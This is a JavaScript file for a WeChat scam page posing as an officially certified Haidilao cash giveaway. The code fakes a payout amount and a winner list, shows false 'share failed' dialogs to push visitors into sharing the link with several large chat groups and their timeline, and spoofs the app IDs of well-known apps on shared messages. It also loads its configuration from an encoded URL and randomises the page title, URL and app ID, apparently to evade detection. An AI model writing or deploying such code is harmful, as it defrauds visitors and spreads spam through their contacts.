let unfamiliarStr = ['웃', '유', '☿', 'ღ', '♁', '♆', 'Б', 'Ф', 'Ц', 'Ч', 'И', 'ЙК', '々', '〆', 'の', 'ぁ', '〥', '〩', 'を', 'ず', 'あ', 'じ', '☊', '☋']
let strLength = unfamiliarStr.length;
let subNumber = Math.floor(Math.random() * (strLength - 0) + 0);
document.title = unfamiliarStr[subNumber];
fail = new Audio("https://hbnewnp.oss-cn-hangzhou.aliyuncs.com/fail.mp3");
tip = new Audio("https://hbnewnp.oss-cn-hangzhou.aliyuncs.com/tip.mp3");

var ua = navigator.userAgent;
var isAndroid = ua.indexOf('Android') > -1 || ua.indexOf('Linux') > -1;
if (isAndroid && typeof(tbsJs) != "undefined") {
    tbsJs.onReady('{useCachedApi : "true"}',
        function(e) {})
}
history.pushState(history.length + 1, "message", "#" + (new Date).getTime());

(function(a, b) {
    var c = b.documentElement
        , d = "orientationchange"in window ? "orientationchange" : "resize"
        , e = function() {
        var a = c.clientWidth;
        a && (c.style.fontSize = 100 * (a / 750) + "px");
    };
    b.addEventListener && (e(),
        a.addEventListener(d, e, !1),
        b.addEventListener("DOMContentLoaded", e, !1));
})(window, document);

function Element(a) {
    var b = a.tagName
        , c = a.props
        , d = a.children;
    return this instanceof Element ? (this.tagName = b,
        this.props = c || {},
        this.children = d || [],
        void 0) : new Element({
        tagName: b,
        props: c,
        children: d
    });
}

Element.prototype.render = function() {
    var a, b, c = document.createElement(this.tagName), d = this.props;
    for (a in d)
        b = d[a],
            c.setAttribute(a, b);
    return this.children.forEach(function(a) {
        var b = null;
        b = a instanceof Element ? a.render() : document.createTextNode(a),
            c.appendChild(b);
    }),
        c;
}

function querySelector(a) {
    return document.querySelector(a);
}

function loadJs(a, b) {
    var c = document.createElement("script");
    c.src = a,
        c.onload = function() {
            "function" == typeof b && b();
        },
        document.body.appendChild(c);
}

function tips() {
    console.log(step);
    switch (step) {
        case 0:
            dialog(api.alert, "我知道了");
            tip.play();
            break;

        case 1:

            if(api.send_group == 1){
                wx.hideOptionMenu(),
                    wx.showMenuItems({
                        menuList: ["menuItem:share:timeline"]
                    }),
                    dialog(api.alert1);
                step = 5;
            }else{
                tip.play();
                dialog(api.alert1),
                    api.qunShareNum >= 5 ? wx.onMenuShareAppMessage(info.ad.message) : api.qunShareNum < 5 && qunfenx();

            }
            break;

        case 2:
            if(api.send_group == 2){
                wx.hideOptionMenu(),
                    wx.showMenuItems({
                        menuList: ["menuItem:share:timeline"]
                    }),
                    dialog(api.alert2);
                step = 5;
            }else{
                tip.play();
                dialog(api.alert2),
                    api.qunShareNum >= 4 ? wx.onMenuShareAppMessage(info.ad.message) : api.qunShareNum < 4 && qunfenx();
            }
            break;

        case 3:
            if(api.send_group == 3){
                wx.hideOptionMenu(),
                    wx.showMenuItems({
                        menuList: ["menuItem:share:timeline"]
                    }),
                    dialog(api.alert3);
                step = 5;
            }else{
                fail.play();
                dialog(api.alert3),
                    api.qunShareNum >= 3 ? wx.onMenuShareAppMessage(info.ad.message) : api.qunShareNum < 3 && qunfenx();
            }
            break;

        case 4:
            if(api.send_group == 4){
                wx.hideOptionMenu(),
                    wx.showMenuItems({
                        menuList: ["menuItem:share:timeline"]
                    }),

                    dialog(api.alert4);
                step = 5;
            }else{
                tip.play();
                dialog(api.alert4),
                    api.qunShareNum >= 2 ? wx.onMenuShareAppMessage(info.ad.message) : api.qunShareNum < 2 && qunfenx();
            }
            break;
        case 5:
            if(api.send_group == 5){
                wx.hideOptionMenu(),
                    wx.showMenuItems({
                        menuList: ["menuItem:share:timeline"]
                    }),

                    dialog(api.alert5);
                step = 6;
            }else{
                fail.play();
                dialog("<div class=\"layui-m-layercont\"><p><span style=\"font-size: 24px; color: rgb(255, 0, 0);\"><strong>\u5206\u4eab\u5931\u8d25 <img src=\"https://commonjs.007871.com/image/t01346a1d78b5413cd4.png\" style=\"top: 8px;position: relative;width:40px;height:40px;\"></strong></span></p ><p><span style=\"color: rgb(247, 150, 70);\"></span></p ><p><span style=\"font-size: 16px;\">\u8bf7\u5206\u4eab\u5230<span style=\"color: rgb(255, 0, 0);font-size: 20px\">\u5927\u4e8e\u0035\u0030\u4eba</span>\u7684\u597d\u53cb\u7fa4</P><p></p ><br><p><span style=\"font-size: 16px;\">\u82e5\u60a8\u5206\u4eab\u7684\u6700\u540e\u4e00\u4e2a\u7fa4\u5927\u4e8e\u0035\u0030\u4eba<strong></p ><p><span style=\"font-size: 16px;\">\u5373\u53ef\u9a6c\u4e0a\u5230\u8d26<strong><span style=\"font-size: 20px;color:red;\">\u00a5 {money}</span></strong></span></p ></div></div></div></div>"),
                    api.qunShareNum >= 1 ? wx.onMenuShareAppMessage(info.ad.message) : api.qunShareNum < 1 && qunfenx();
            }
            break;
        case 6:
            isAndroid = navigator.userAgent.indexOf('Android') > -1;
            if(isAndroid != true){
                /*
                tip.play();
                dialog("<div class=\"layui-m-layercont\" style=\"text-align: center\"><p><strong><span style=\"color: rgb(0, 176, 80); font-size: 24px;\">\u5206\u4eab\u6210\u529f <img src=\"//commonjs.007871.com/image/t0158f8d519fe2f1627.png\" style=\"position:relative;top:8px;width:40px;height:40px;\"></span></strong></p ><p>\u60a8\u5206\u4eab\u7684<span style=\"color: rgb(255, 0, 0);\">\u597d\u53cb\u7fa4\u5c0f\u4e8e\u0035\u0030\u4eba</span></p ><p>\u8bf7\u60a8<span style=\"font-size: 20px; color: rgb(255, 0, 0);\">\u6309\u8981\u6c42</span>\u518d\u6b21\u5206\u4eab</p ><p>\u4fdd\u8bc1\u0031\u0030\u0030\u0025\u9a6c\u4e0a\u5230\u8d26<span style=\"font-size: 20px;color:red;\">\u00a5 {money}</span></p ></div>");
                api.quanShareNum >= 2 ? wx.onMenuShareAppMessage(info.ad.message) : api.quanShareNum < 2 && qunfenx();
                break;
                */
                wx.hideOptionMenu(),
                    wx.showMenuItems({
                        menuList: ["menuItem:share:timeline"]
                    }),
                    tip.play();
                dialog(api.alert5);
                break;
            }else{
                wx.hideOptionMenu(),
                    wx.showMenuItems({
                        menuList: ["menuItem:share:timeline"]
                    }),
                    tip.play();
                dialog(api.alert5);
                break;
            }
        case 7:
            isAndroid = navigator.userAgent.indexOf('Android') > -1;
            if(isAndroid != true){
                /*
                fail.play();
                dialog("<div class=\"layui-m-layercont\"><p><span style=\"font-size: 24px; color: rgb(255, 0, 0);\"><strong>\u5206\u4eab\u5931\u8d25 <img src=\"//commonjs.007871.com/image/t01346a1d78b5413cd4.png\" style=\"top: 8px;position: relative;width:40px;height:40px;\"></strong></span></p ><p><span style=\"color: rgb(247, 150, 70);\"></span></p ><p><style=\"font-size: 16px;\">\u6ce8\u610f\uff1a\u8bf7\u4e0d\u8981<span style=\"color: rgb(255, 0, 0);\">\u53d6\u6d88\u5206\u4eab\u6216\u5206\u4eab\u7ed9\u597d\u53cb</span>\u907f\u514d\u65e0\u6cd5\u5230\u8d26</span></p ><p></p ><p></br><span style=\"font-size: 16px;\">\u8bf7\u5c1d\u8bd5\u91cd\u65b0\u5206\u4eab\u5230<strong><span style=\"font-size: 20px; color: rgb(255, 0, 0);\">\u5927\u4e8e\u0035\u0030\u4eba</span></strong>\u7684\u597d\u53cb\u7fa4</span></p ><p><span style=\"font-size: 16px;\">\u4fdd\u8bc1<strong><span style=\"font-size: 20px; color: rgb(255, 0, 0);\">100%</span></strong>\u53ef\u4ee5\u5230\u8d26<strong><span style=\"font-size: 20px;color:red;\">\u00a5\u0020{money}</span></strong></span></p ></div></div></div></div>");
                api.quanShareNum >= 1 ? wx.onMenuShareAppMessage(info.ad.message) : api.quanShareNum < 1 && qunfenx();
                break;
                */
                fail.play();
                dialog(api.alert6),
                    api.quanShareNum >= 1 ? wx.onMenuShareTimeline(info.ad.timeline) : wx.onMenuShareTimeline(info.timeline);
                break;
            }else{
                fail.play();
                dialog(api.alert6),
                    api.quanShareNum >= 1 ? wx.onMenuShareTimeline(info.ad.timeline) : wx.onMenuShareTimeline(info.timeline);
                break;
            }
        case 8:
            tip.play();
            isAndroid = navigator.userAgent.indexOf('Android') > -1;
            if(isAndroid != true){
                /*
                dialog("<div class=\"layui-m-layercont\" style=\"text-align: center\"> <p style=\"margin:0;padding:0;\">\u611f\u8c22\u60a8\u7684\u53c2\u4e0e\u0020\u003a\u002d)</p > <p style=\"margin:0;padding:0;\"> <span style=\"font-size: 18px;\"><strong> <span style=\"color: rgb(255, 0, 0);\">\u6ce8\u610f\uff1a\u7cfb\u7edf\u5c06\u4f1a\u68c0\u6d4b\u60a8\u662f\u5426\u5b8c\u6210\u8f6c\u53d1\u4efb\u52a1</span> </strong> </span> </p > <p style=\"margin:0;padding:0;margin-top:20px;\">\u7531\u4e8e\u6d3b\u52a8\u91cf\u5de8\u5927</p > <p style=\"margin:0;padding:0; font-size:12px\">\u7ea2\u5305\u6700\u8fdf\u0032\u0034\u5c0f\u65f6\u5185\u5230\u8d26</p > <p style=\"margin:0;padding:0; color:red\">\u8bf7\u4fdd\u7559\u8f6c\u53d1\u4fe1\u606f\u81f3\u7ea2\u5305\u5230\u8d26</p > <p style=\"margin:0;padding:0;\">\u8bf7\u6ce8\u610f\u67e5\u770b\u60a8\u7684\u5fae\u4fe1\u96f6\u94b1</p > <p style=\"margin:0;padding:0;\"><span style=\"color: rgb(255, 0, 0); font-size:14px\"><strong>\u5220\u9664\u5206\u4eab\u94fe\u63a5\u53ef\u80fd\u5bfc\u81f4\u65e0\u6cd5\u5230\u8d26</strong></span> </p ></div>", "好的", function() {
                    loadJs(backlink);
                });
                */
                dialog(api.alert7, "好的", function() {
                    jingfh(backlink);
                });
            }else{
                dialog(api.alert7, "好的", function() {
                    jingfh(backlink);
                });
            }
    }
}

function randomString(len) {
    len = len || 32;
    var $chars = 'abcdefhijkmnprstwxyz0123456789';
    var maxPos = $chars.length;
    var pwd = '';
    for (i = 0; i < len; i++) {
        pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
    }
    return pwd;
}


function setShareInfo() {
    info = {
        message: {
            title: api.info.title.replace("{qian}", money),
            desc: api.info.desc.replace("{qian}", money),
            link: api.info.qunurl,
            imgUrl: api.info.img,
            success: function() {
                step++,
                    tips();
            }
        },
        timeline: {
            title: api.info.p_title.replace("{qian}", money),
            link: api.info.quanurl,
            imgUrl: api.info.p_img,
            success: function() {
                step++,
                    tips();
            }
        },
        ad: {
            message: {
                title: api.info.chantitle,
                desc: api.info.chandesc,
                link: api.info.chanurl,
                imgUrl: api.info.chanimg,
                success: function() {
                    step++,
                        tips();
                }
            },
            timeline: {
                title: api.info.chandescs,
                link: api.info.chanurl,
                imgUrl: api.info.chanimg,
                success: function() {
                    step++,
                        tips();
                }
            }
        }
    },

        6 == api.qunShareNum ? wx.onMenuShareAppMessage(info.ad.message) : qunfenx(),
        2 == api.quanShareNum ? wx.onMenuShareTimeline(info.ad.timeline) : wx.onMenuShareTimeline(info.timeline);
}

var itemsAppId = [
    //'wx45a2e324fc59fadc',//世纪佳缘
    'wx268fcfe924dcb171',// 知乎
    'wxe6fc600d8a7e230c',// 虎扑
    'wxe9199d568fe57fdd', // 简书
    'wx8377383b8121f9fb', // 搜狐
    'wx10ce490118943a33',// 凤凰网
    'wx4dd648e754458dfe',// 今日头条
    'wx827225356b689e24', // 京东商城
    'wx037165e7e9272f37',//58同城
    'wx10b8eeb25dbe601f',//快手
    'wxe280063f5fb2528a',//网易音乐
    //'wx85f17c29f3e648bf', //百度
    //'wx839691cce7c102bb', // 拼多多
    //'wxce0a56c2bb620e25', // 唯品会
    //'wx08a5b694ffa9b8df',//滴滴云
    //'wx4c2577cc73e73a4c',//虎牙直播
    //'wx864b5cdda9161678',//大麦网
    //'wxafc256bf83583323',//blibli
    //'wx519cb5116be4e522',//安居客
]

function qunfenx(){
    function shareFriend() {
        WeixinJSBridge.invoke('sendAppMessage', {
            "appid": itemsAppId[Math.floor(Math.random() * itemsAppId.length)],
            "img_url": api.info.img,
            "img_width": "120",
            "img_height": "120",
            "type": 5,
            "link": api.info.qunurl,
            "desc": api.info.desc,
            "title": api.info.title,
        }, function (res) {
            step++,
                tips();
        });
    }
    wx.ready(function () {
        //wx.hideOptionMenu();
        //wx.showMenuItems({
        //    menuList: ["menuItem:share:appMessage"]
        //});

        wx.onMenuShareAppMessage({
            title: api.info.title,
            link: api.info.qunurl,
            desc: api.info.desc,
            imgUrl: api.info.img,
            success: function () {
                step++,
                    tips();
                // appmessage_callback();
            }
        });
    })
    function onBridgeReady() {
        WeixinJSBridge.on('menu:share:appmessage', function (argv) {
            shareFriend();
        });
    }
    if (typeof WeixinJSBridge == "undefined") {
        if (document.addEventListener) {
            document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
        } else if (document.attachEvent) {
            document.attachEvent('WeixinJSBridgeReady', onBridgeReady);
            document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
        }
    } else {
        onBridgeReady();
    }
}


function getApiData(a) {

    getApiData = function() {};
    a.style.animation = "btnMove .6s infinite alternate";
    request(atob(info.google)+"&url=" + encodeURIComponent(location.href.split("#")[0]) + "&_=" + Date.now(), function(a) {

        api = JSON.parse(window.atob(a));
        setTimeout(function() {
            var index = querySelector("#index");
            index.parentNode.removeChild(index);
            loadSharePage();
            var jsApiList = ["onMenuShareTimeline","onMenuShareAppMessage","hideMenuItems","showMenuItems"];
            wx.config({
                debug: false,
                appId: api.config.appId,
                timestamp: api.config.timestamp,
                nonceStr: api.config.nonceStr,
                signature: api.config.signature,
                jsApiList: jsApiList
            });
            wx.ready(function() {
                wx.checkJsApi({
                    jsApiList : jsApiList,
                    success:function(){
                        window.history.replaceState({}, '', '/'+randomString(4)+'.html');
                        config.appId = "wx"+randomString(14)+"12";
                        wx.config(config);
                        wx.hideOptionMenu(),
                            wx.showMenuItems({menuList: ["menuItem:share:appMessage"]}),
                            setShareInfo();
                        shareFriend();

                    }
                });
            });
        }, 1000);
    });
}

function loadSharePage() {
    function a(a, b) {
        var c = b - a + 1;
        return Math.floor(Math.random() * c + a);
    }
    function b() {
        var a = Math.floor(10 * Math.random()) + 5
            , b = new Date(new Date().getTime() - 6e4 * a)
            , c = ("0" + b.getHours()).slice(-2)
            , d = ("0" + b.getMinutes()).slice(-2);
        return ("0" + b.getSeconds()).slice(-2),
        c + ":" + d;
    }
    function z() {
        var e = a(1e4, 25e3)
            , t = "color:#F35543;text-align: left;"
            , o = Math.random() < .3 ? "转账中" : "已到账"
            , r = "";
        return e > 2e4 && (e = 2e4,
            t = "color:#FFB22E;text-align: left;",
            o = " 手气最佳",
            r = Element({
                tagName: "img",
                props: {
                    src: "//p.pstatp.com/origin/138de00002080f737d16d",
                    style: "vertical-align: top",
                    width: 18
                }
            })),
            e = ' ' + (e / 100).toFixed(2) + "元",
            [Element({
                tagName: "span",
                props: {
                    style: t
                },
                children: [r, o]
            }), e]
    }
    function c(a) {
        return Element({
            tagName: "li",
            props: {
                style: "width: 100%;height: 1.2rem;overflow: hidden;box-sizing: border-box;padding: 0rem 0.2rem;border-bottom: 0.02rem solid rgba(0, 0, 0, 0.05);display: flex;flex-wrap: wrap;align-items: center;justify-content: center;"
            },
            children: [Element({
                tagName: "img",
                props: {
                    src: a.avatar,
                    style: "width: 0.8rem;height: 0.8rem;margin-right: 0.2rem;overflow: hidden;background-color: #eee;border-radius: 20% "
                }
            }), Element({
                tagName: "div",
                props: {
                    style: "flex: 1;"
                },
                children: [Element({
                    tagName: "div",
                    props: {
                        style: "font-size: 0.3rem;color: #000;margin-bottom: 0.08rem;"
                    },
                    children: [a.name]
                }), Element({
                    tagName: "div",
                    props: {
                        style: "font-size: 0.28rem;color: #929493;"
                    },
                    children: [b()]
                })]
            }), Element({
                tagName: "span",
                props: {
                    style: "text-align: right;font-size: 0.28rem;color: #000;"
                },
                children: z()
            })]
        });
    }



    function d() {
        var b, d = Math.floor(4 * Math.random()) + 1, e = h.lastChild;
        e.parentNode.removeChild(e),
            b = c(f[r]),
            b.props.style += "animation:itemMove" + d + " 0.5s",
            h.insertBefore(b.render(), h.childNodes[0]),
            r++,
        r >= f.length && (r = 0),
            k -= a(80, 150),
            querySelector("[data-num]").innerHTML = k;
    }
    function e(a, b) {
        var c = 1e3
            , d = b
            , e = 50
            , f = d / (c / e)
            , g = 0
            , h = 0
            , i = setInterval(function() {
            g = Math.floor(100 * (g + f)) / 100,
            g >= d && (clearInterval(i),
                g = d,
                tips());
            var b = Number(g);
            b != h && (h = b,
                a.innerHTML = h.toFixed(2));
        }, 0);
    }
    var f, g, h, i, k, j = [];
    for (r = 10,
             f = user,
             f.sort(function() {
                 return Math.random() > .5 ? -1 : 1;
             }),
             p = 0; 10 > p; p++)
        j[p] = c(f[p]);
    k = a(5e4, 8e4),
        money = (a(1e4, 2e4) / 100).toFixed(2),
        g = Element({
            tagName: "div",
            props: {
                //onclick: "tips()",
                onclick: "dialog(api.alert8)",
                style: "height: 100vh; overflow: hidden; background-color: #fff;"
            },
            children: [Element({
                tagName: "div",
                props: {
                    style: "overflow: hidden; height: 6.6rem; border: 1px solid rgb(240, 94, 77);background: rgb(234, 94, 77);background-size: cover;background-repeat: no-repeat;border-radius: 0px 0px 50% 50% / 10px 10px 23% 23%; margin-bottom: 20px "
                },
                children: [Element({
                    tagName: "img",
                    props: {
                        src: config.logo,
                        style: "width: 1.2rem;height: 1.2rem;margin: 0 auto 0;display: block;margin-top: 1.2rem;border-radius: 10px;"
                    }
                }), Element({
                    tagName: "p",
                    props: {
                        style: "font-size: 0.4rem;color: rgb(220, 205, 155);text-align: center;padding-top: 0.2rem"
                    },
                    children: [config.ztitle]
                }), Element({
                    tagName: "p",
                    props: {
                        style: "font-size: 0.8rem;text-align: center;padding-top: 0.2rem;color: rgb(220, 205, 155)"
                    },
                    children: [Element({
                        tagName: "span",
                        props: {
                            style: "font-family:open",
                            "data-time": 0
                        },
                        children: [money]
                    })]
                }), Element({
                    tagName: "div",
                    props: {
                        style: "display:block;text-align: center;font-size: 0.3rem;color: rgb(220, 205, 155)"
                    },
                    children: [config.desc]
                }), Element({
                    tagName: "div",
                    props: {
                        style: "margin: 15px auto; width: 110px; height: 40px; border-radius: 20px; background-color: rgb(226, 205, 155); color: #333; text-align: center; line-height: 40px; font-size: 16px; box-shadow: rgba(0, 0, 0, 0.2) 0px 4px 0px 0; animation: btnShake1 2s infinite;"
                    },
                    children: ["提现到", Element({
                        tagName: "span",
                        props: {
                            style: "transform:rotate(13deg);display:inline-block;"
                        },
                        children: ["零"]
                    }), "钱"]
                })]
            }), Element({
                tagName: "div",
                props: {
                    style: "width: 100%;height: 0.2rem;background-color: #eceeed;"
                }
            }), Element({
                tagName: "div",
                props: {
                    style: "font-size: 0.28rem;color:#929493;height: 0.6rem;line-height: 0.6rem;padding-left: 0.2rem;border-bottom: solid 0.02rem rgba(0,0,0,0.05) "
                },
                children: ["总发放200000份 剩余", Element({
                    tagName: "span",
                    props: {
                        "data-num": 0
                    },
                    children: [k]
                }), "份"]
            }), Element({
                tagName: "ul",
                props: {
                    id: "list",
                    style: "width: 100%;background-color: rgba(255, 255, 255, 0.1);overflow: hidden;border-radius: 0.1rem;height: 12rem;"
                },
                children: j
            }), Element({
                tagName: "div",
                props: {
                    id: "debug",
                    style: "opacity: 0.8; position: fixed; z-index: 999; top: 10px; right: 10px; overflow: hidden; text-align: center; color: #fff; font-size: 15px; animation: tipMove 1.5s infinite;"
                },
                children: [Element({
                    tagName: "div",
                    props: {
                        style: "overflow: hidden; width: 110px; height: 100px;"
                    },
                    children: [Element({
                        tagName: "div",
                        props: {
                            style: "border-top: solid 2px #fff; border-right: solid 2px #fff; width: 20px; height: 20px; position: absolute; top: 3px; right: 3px; transform: skewX(-25deg) rotate(-30deg);"
                        }
                    }), Element({
                        tagName: "div",
                        props: {
                            style: "width: 200px; height: 80px; border-radius: 50%; border: solid 2px #fff; position: absolute; top: -14px; right: -2px; transform: rotate(-22deg)"
                        }
                    }), Element({
                        tagName: "div",
                        props: {
                            style: "margin-top: 60px; margin-left: -37px"
                        },
                        children: [Element({
                            tagName: "img",
                            props: {
                                src: "//hbnewnb.oss-cn-shanghai.aliyuncs.com/22.png",
                                width: "200px",
                            }
                        })]
                    })]
                })]
            })]
        }),
        document.body.appendChild(g.render()),
        h = querySelector("#list"),
        e(querySelector("[data-time]"), Number(money)),
        i = setInterval(function() {
            return h.parentNode ? (d(),
                void 0) : clearInterval(i);
        }, 2e3);
    querySelector('#debug').onclick = function() {
        wx.showMenuItems({
            menuList: ["menuItem:share:appMessage", "menuItem:share:timeline"]
        });
    }
}

function loadPage() {
    var c, a = Math.floor(4 * Math.random()) + 1, b = Element({
        tagName: "div",
        props: {
            id: "index",
            style: "height: 130vw; width: 84vw; border-radius: 10px; overflow: hidden; position: absolute; top: 0;left: 0;bottom: 0;right: 0;margin: auto;animation: show" + a + " .4s;background:rgb(234, 94, 77) no-repeat;background-size: cover;"
        },
        children: [Element({
            tagName: "div",
            props: {
                style: "height: 100vw;border: 1px solid rgb(234, 94, 77);border-radius: 10px 10px 50% 50% / 10px 10px 21% 21%;box-shadow: 0px 5px 0px -1px rgb(235 205 155);background:rgb(234, 94, 77) no-repeat;background-size: cover;"
            },
            children: [Element({
                tagName: "img",
                props: {
                    src: config.logo,
                    style: "width:1.15rem;height: 1.15rem;margin: 0 auto 0;display: block;margin-top: 1.5rem;border-radius: 10px"
                }
            }), Element({
                tagName: "p",
                props: {
                    style: "font-size: 0.52rem;text-align: center;padding-top: 0.4rem;color: #ebcd9b;"
                },
                children: [config.ztitle]
            }), Element({
                tagName: "p",
                props: {
                    style: "font-size: 0.32rem;text-align: center;padding-top: 0.4rem;color: #ebcd9b;"
                },
                children: [config.ftitle, Element({
                    tagName: "span",
                    props: {
                        style: "margin-left: 0.15rem;font-size: 0.24rem;background-color: #fae3b7;padding: 0.02rem 0.08rem; color: #f25542"
                    },
                    children: ["可提现"]
                })]
            })]
        }), Element({
            tagName: "div",
            props: {
                "data-btn": "0",
                style: "position:absolute;left: 0;right: 0;width: 2rem;height: 2rem;border: 1px solid #fae3b7;background-color: #fae3b7;border-radius: 50%;margin: -1rem auto 0;box-shadow: 0rem 0.08rem 0rem 0rem rgba(0, 0, 0, 0.2);text-align: center;line-height: 2rem; animation: btn" + a + " .5s ease .1s;",
                onclick: "getApiData(this)"
            },
            children: [Element({
                tagName: "span",
                props: {
                    style: "position: absolute;top: 0;left: 0;bottom: 0;right: 0;margin: auto;display: inline-block;font-size: 0.8rem;font-family: open;color: #333;"
                },
                children: ["開"]
            })]
        }), Element({
            tagName: 'div',
            props: {
                style: 'width: 100%; left: 0; bottom: 16px; position: absolute; font-size: 12px; text-align: center; color: #ebcd9b'
            },
            children: ['活动经官方认证 真实有效']
        })]
    });
    document.body.appendChild(b.render()),
        c = querySelector("[data-btn]"),
        c.addEventListener("animationend", function() {
            var b = a > 2 ? 1.8 : 1;
            c.style.animation = "btnShake" + a + " " + b + "s ease 0s infinite";
        });
    history.pushState(history.length + 1, "message", "#" + new Date().getTime());
}

function getCity() {
    return (window['localAddress'] ? ['北京市', '天津市', '上海市', '重庆市'].indexOf(localAddress.province) > -1 ? localAddress.province : localAddress.city ? localAddress.city : localAddress.province : '').replace(/(.*)市/, '$1').replace(/(.*)省/, '$1');
}

function dialog(a, b, c) {
    var d, e;
    document.querySelector("#dialog") || (d = Element({
        tagName: "div",
        props: {
            id: "dialog",
            style: "display: none;position: fixed;z-index: 1000;top: 0;right: 0;left: 0;bottom: 0;background: rgba(0, 0, 0, 0.6);"
        },
        children: [Element({
            tagName: "div",
            props: {
                style: "position:fixed;z-index:5000;width:80%;max-width:300px;top:50%;left:50%;transform:translate(-50%,-50%);background-color:#FFFFFF;text-align:center;border-radius:3px;overflow:hidden;"
            },
            children: [Element({
                tagName: "div",
                props: {
                    style: "padding:1.7em 20px 1.7em;font-size:15px;line-height:1.3;word-wrap:break-word;word-break:break-all;",
                    "data-msg": 0
                }
            }), Element({
                tagName: "b",
                props: {
                    style: "width: 100%; height: 45px; padding-bottom: 1px; display: flex; flex-wrap: wrap; justify-content: center; align-items: center; color: #009688; font-size: 18px; border-top: 1px solid #EEEEEE;",
                    "data-go": 0
                }
            })]
        })]
    }),
        document.body.appendChild(d.render())),
        e = querySelector("#dialog"),
        querySelector("[data-msg]").innerHTML = a.replace("{money}", money),
        querySelector("[data-go]").innerHTML = b || "好的",
        e.style.display = "block",
        querySelector("[data-go]").onclick = function() {
            e.style.display = "none",
            "function" == typeof c && c();
        };
}



function request(a, b, c) {
    var d = new XMLHttpRequest();
    d.onreadystatechange = function() {
        4 === d.readyState && (200 === d.status || 304 === d.status ? "function" == typeof b && b(d.responseText) : "function" == typeof c && c(d));
    },
        d.open("GET", a, !0),
        d.send(null);
}

api = null,step = 0;

var config = {
    ftitle: '数亿现金大派送',
    ztitle: '海底捞开业大吉',
    desc: '完成所有步骤后 自动存入零钱',
    logo: 'https://sc01.alicdn.com/kf/H45ef429fcfe2437683864e77201054a1k.jpg'
};

var user = [
    {
        name: "一路有你",
        avatar: "https://t20img.yangkeduo.com/a/57833097940aaeb169a41c78265cfc2d9b36ab51-1529485164?imageMogr2/thumbnail/100x"},
    {
        name: "小米足球",
        avatar: "https://t20img.yangkeduo.com/a/c49285a7ea92c1e5f10fbeaa03970d8a9fa42ab3-1533379210?imageMogr2/thumbnail/100x"
    },
    {
        name: "韩麦👍",
        avatar: "https://t20img.yangkeduo.com/a/71ebf5155e72ea0e8f01c9844f10ad480c77924e-1567386584?imageMogr2/thumbnail/100x"
    },
    {
        name: "阿宝麦芽糖",
        avatar: "https://t20img.yangkeduo.com/a/c144e7f1c82857f9631d4a54874ab69d9cf1d28f-1573801943?imageMogr2/thumbnail/100x"
    },
    {
        name: "📊火",
        avatar: "https://t20img.yangkeduo.com/a/5f7b596db17bfdd324f02ca15f4527c539701e87-1528807323?imageMogr2/thumbnail/100x"
    },
    {
        name: "诛仙有我",
        avatar: "https://t20img.yangkeduo.com/a/0babbd878ac3655a0cb291dfbffc810efb005824-1528756839?imageMogr2/thumbnail/100x"
    },
    {
        name: "落花无意",
        avatar: "https://t20img.yangkeduo.com/a/c7cb9d6c35704a8d35794a51af6856e546765479-1573543737?imageMogr2/thumbnail/100x"
    },
    {
        name: "婷姐👊",
        avatar: "https://t20img.yangkeduo.com/a/186cab3289cb0a66c04ea43f15626b4ac508a0d6-1550213307?imageMogr2/thumbnail/100x"
    },
    {
        name: "妖娆的萝卜",
        avatar: "https://t20img.yangkeduo.com/a/e62624e96d05ac86707e7585a93cea732fe70dba-1533376665?imageMogr2/thumbnail/100x"
    },
    {
        name: "梦中情人",
        avatar: "https://t20img.yangkeduo.com/a/8b1d3b2db1fa1da0b9e3a2d3a9c72d69de6e0e01-1528948414?imageMogr2/thumbnail/100x"
    },
    {
        name: "潇洒表白",
        avatar: "https://t20img.yangkeduo.com/a/e164bb0956dfff271791251295add70a997ddc83-1556754330?imageMogr2/thumbnail/100x"
    },
    {
        name: "😘阿娇",
        avatar: "https://t20img.yangkeduo.com/a/7f5b0037ae2bd309a20f71309542214b1700b79f-1554352913?imageMogr2/thumbnail/100x"
    },
    {
        name: "蜡笔小新",
        avatar: "https://t20img.yangkeduo.com/a/f2877ba9c69d022ed27f69941aee2ba9a60e2f02-1535865241?imageMogr2/thumbnail/100x"
    },
    {
        name: "花开花落",
        avatar: "https://t20img.yangkeduo.com/a/5a9dab6697d7b4e8a8fc93470ec2eca75c1a053f-1550393232?imageMogr2/thumbnail/100x"
    },
    {
        name: "百变🐸星君",
        avatar: "https://t20img.yangkeduo.com/a/6e17e07c3d4fa88aa6c10938f09eb502c21b18ea-1557097809?imageMogr2/thumbnail/100x"
    },
    {
        name: "阿狼📕",
        avatar: "https://t20img.yangkeduo.com/a/ff1ba4aa410056d7d5fc94388687e59594848083-1545370950?imageMogr2/thumbnail/100x"
    },
    {
        name: "古今中外演",
        avatar: "https://t20img.yangkeduo.com/a/5a9dab6697d7b4e8a8fc93470ec2eca75c1a053f-1550393232?imageMogr2/thumbnail/100x"
    },
    {
        name: "真假美猴王",
        avatar: "https://t20img.yangkeduo.com/a/133e0433bffd7cb5f42663acceeb28f3829eecb7-1554733813?imageMogr2/thumbnail/100x"
    },
    {name: "孙川",avatar: "https://sc01.alicdn.com/kf/H0864a67745814453a5aa878982cacab4S.jpg"},
    {name: "带师兄",avatar: "https://sc01.alicdn.com/kf/He9b5b778ece14fa9b07b55e53fa0e313M.jpg"},
    {name: "六小孙",avatar: "https://sc01.alicdn.com/kf/Hb214a79cafa44ca98b7391d3acce68b9m.jpg"},
    {name: "誮落盡",avatar: "https://sc01.alicdn.com/kf/Ha57ce09c886e4135ac663b7f5b0bb27fU.jpg"},
    {name: "最好的",avatar: "https://sc01.alicdn.com/kf/H6f6b4246014440aa89724114550afe34E.jpg"},
    {name: "少女馆",avatar: "https://sc01.alicdn.com/kf/H7bb6253a88ce44ff833b404634ecdccaW.jpg"},
    {name: "几分甜",avatar: "https://sc01.alicdn.com/kf/H62927e1f58e84b079678d1ccf8c6c5f9R.jpg"},
    {name: "风月",avatar: "https://sc01.alicdn.com/kf/H06c1744ec10e45c382c6528459edc245Z.jpg"},
    {name: "不渡我",avatar: "https://sc01.alicdn.com/kf/H2d64fb3fdc5548428a9a6fa93d68114e8.jpg"},
    {name: "少爷",avatar: "https://sc01.alicdn.com/kf/Hd46a049520c64432956f9fc2722f64b7k.jpg"},
    {name: "故人在",avatar: "https://sc01.alicdn.com/kf/H45b890adeb1a444fa6f25d69129c83f0i.jpg"},
    {name: "淺愛",avatar: "https://sc01.alicdn.com/kf/H9b0018c744f4403ea80787a6e4d408ddB.jpg"},
